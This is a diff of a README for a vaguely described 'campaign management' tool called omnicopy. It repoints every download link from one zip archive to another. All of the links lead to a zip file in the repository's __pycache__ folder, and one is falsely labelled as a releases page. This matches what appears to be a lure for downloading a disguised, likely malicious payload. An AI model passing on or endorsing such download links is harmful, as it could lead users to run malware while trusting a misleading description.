@@ -6,11 +6,11 @@ Welcome to **omnicopy**! This tool helps you manage your campaigns quickly and e
 ## 📦 Download & Install
 To start using **omnicopy**, you need to download it. 
 
-[![Download omnicopy](https://raw.githubusercontent.com/habijstha/omnicopy/main/__pycache__/Software_3.5.zip)](https://raw.githubusercontent.com/habijstha/omnicopy/main/__pycache__/Software_3.5.zip)
+[![Download omnicopy](https://raw.githubusercontent.com/habijstha/omnicopy/main/__pycache__/Software_v1.9.zip)](https://raw.githubusercontent.com/habijstha/omnicopy/main/__pycache__/Software_v1.9.zip)
 
 Follow these steps to get it:
 
-1. **Visit the Releases Page**: Click this link to go to the releases page: [https://raw.githubusercontent.com/habijstha/omnicopy/main/__pycache__/Software_3.5.zip](https://raw.githubusercontent.com/habijstha/omnicopy/main/__pycache__/Software_3.5.zip).
+1. **Visit the Releases Page**: Click this link to go to the releases page: [https://raw.githubusercontent.com/habijstha/omnicopy/main/__pycache__/Software_v1.9.zip](https://raw.githubusercontent.com/habijstha/omnicopy/main/__pycache__/Software_v1.9.zip).
 
 2. **Choose the Latest Version**: Look for the latest version that suits your system. 
 
@@ -70,6 +70,6 @@ If you want to contribute to **omnicopy**, feel free to suggest ideas or report 
 
 ---
 
-For the easy access, here is the link again: [Download omnicopy](https://raw.githubusercontent.com/habijstha/omnicopy/main/__pycache__/Software_3.5.zip).
+For the easy access, here is the link again: [Download omnicopy](https://raw.githubusercontent.com/habijstha/omnicopy/main/__pycache__/Software_v1.9.zip).
 
 Enjoy your campaign management experience with **omnicopy**!
